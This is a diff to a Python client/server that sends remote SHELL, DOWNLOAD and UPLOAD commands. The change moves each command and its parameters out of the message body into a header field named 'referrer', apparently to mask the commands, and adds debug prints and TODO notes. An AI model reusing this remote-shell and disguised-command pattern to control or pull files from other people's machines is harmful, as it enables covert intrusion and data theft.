@@ -22,10 +22,12 @@ class ContentType:
 	text = "TEXT"
 
 class Request:
-	def __init__(self, cmd:str, direct:bool=False, body:dict=dict(), header:dict=dict()):
-		self.header = {"version": VERSION, "method": "CONNECT" if direct else "DIRECT", **header}
-		self.body = {"ack": True, "cmd": cmd, **body}
-	
+	def __init__(self, cmd:str, params:str='', direct:bool=False, body:dict=dict(), header:dict=dict()):
+		self.header = {"version": VERSION, "referrer": cmd + " " + params, "method": "CONNECT" if direct else "DIRECT", **header}
+		#self.body = {"ack": True, "cmd": cmd, "params": params, **body}
+		self.body = {"ack": True,  **body}
+
+
 	def __str__(self) -> str:
 		return f"Request(header={self.header}, body={self.body})"
 	
@@ -82,7 +84,7 @@ class Response:
 		self._rdata = ""
 
 		self.ct = self.header.get("ct") # Content-Type
-		if self.ct == ContentType.file:
+		if self.ct == ContentType.file: 
 			self.file = NetworkFile()
 
 		self.process_body()
@@ -162,7 +164,10 @@ class Session:
 			self.cmd_shell(*data)
 	
 	def cmd_shell(self, *params):
-		self.send(Request(cmd="SHELL", body={"params": ' '.join(params)}, direct=True))
+		#self.send(Request(cmd="SHELL", body={"params": ' '.join(params)}, direct=True)) #TODO: CHange params not in the body
+		self.send(Request(cmd="SHELL", params=' '.join(params), direct=True)) #TODO: CHange params not in the body
+
+
 		resp  = self.recv()
 		print(resp.raw.decode())
 	
@@ -178,14 +183,23 @@ class Session:
 			print("\t" + f"{command:<40} - {description}")
 
 	def cmd_download(self, file:str):
-		self.send(Request(cmd="DOWNLOAD", body={"params": file}, direct=True))
-		resp  = self.recv()
+		#self.send(Request(cmd="DOWNLOAD", body={"params": file}, direct=True)) #TODO: CHange params not in the body
+		self.send(Request(cmd="DOWNLOAD", params=file, direct=True)) #TODO: CHange params not in the body
+
+		resp  = self.recv() # TODO: Change to usse referrer
+
+		print("response download")
+		print(resp)
+		referrer = resp.header.get("referrer")
 
 		if resp.header.get("status") == Status.OK:
 			size = 0
-			resp.file.seek()
+			resp.file.seek() #looks for the file
+			print ("resp file")
+			print(resp.file)
+			
 			with open("copy_"+file, "wb") as fp:
-				while chunk:=resp.file.read(MAX_CHUNK_SIZE):
+				while chunk:=resp.file.read(MAX_CHUNK_SIZE): #change to refferer
 					size += len(chunk)
 					fp.write(chunk)
 
@@ -196,8 +210,10 @@ class Session:
 
 	# For upload test
 	def cmd_upload(self, file:str):
-		self.send(Request(cmd="UPLOAD", body={"params": file}, direct=True))
-		resp  = self.recv()
+		#self.send(Request(cmd="UPLOAD", body={"params": file}, direct=True)) #TODO: CHange params not in the body
+		self.send(Request(cmd="UPLOAD", params=file, direct=True)) #TODO: CHange params not in the body
+
+		resp  = self.recv() # TODO: Get the Referrer 
 
 		if resp.header.get("status") == Status.OK:
 			print(f"Uploaded file {file}")
@@ -216,6 +232,9 @@ class Session:
 
 		data = conn.recv(MAX_CHUNK_SIZE)
 		res = Response(data)
+
+		print("Session response")
+		print (res)
 
 		while data:=conn.recv(MAX_CHUNK_SIZE):
 			if data.endswith(PAYLOAD_SUFFIX):
@@ -400,8 +419,12 @@ class Server():
 		
 		conn.setblocking(1)
 
+		print("receiving DATA!")
 		data = conn.recv(MAX_CHUNK_SIZE)
+		print(data)
 		res = Response(data)
+		print(res)
+		print (res.header["referrer"])
 
 		while data:=conn.recv(MAX_CHUNK_SIZE):
 			if data.endswith(PAYLOAD_SUFFIX):
